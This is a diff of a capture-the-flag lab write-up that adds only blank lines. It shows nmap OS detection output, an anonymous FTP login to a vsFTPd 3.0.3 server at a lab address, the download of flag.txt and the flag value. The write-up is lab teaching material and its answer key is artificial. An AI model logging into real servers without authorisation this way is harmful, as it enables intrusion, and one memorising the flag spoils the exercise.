@@ -116,6 +116,7 @@ PORT   STATE SERVICE VERSION
 
 Device type: general purpose
 Running: Linux 4.X|5.X
+
 OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
 OS details: Linux 4.15 - 5.19
 
@@ -126,14 +127,17 @@ Service Info: OS: Unix
 ### Exploitation
 ftp 10.129.1.14                                                                                                                           
 Connected to 10.129.1.14.
+
 220 (vsFTPd 3.0.3)
 Name (10.129.1.14:kali): Anonymous
 331 Please specify the password.
+
 Password: 
 230 Login successful.
 
 Remote system type is UNIX.
 Using binary mode to transfer files.
+
 ftp> 
 ftp> ls
 
@@ -144,6 +148,7 @@ ftp> ls
 
 ftp> get  flag.txt
 local: flag.txt remote: flag.txt
+
 229 Entering Extended Passive Mode (|||34470|)
 150 Opening BINARY mode data connection for flag.txt (32 bytes).
 100% |**************************************************************************************************************|    32        0.39 KiB/s    00:00 ETA
@@ -155,6 +160,7 @@ ftp> bye
 
 
 ### Flag
+
 cat flag.txt  
 035db21c881520061c53e0536e44f815
 
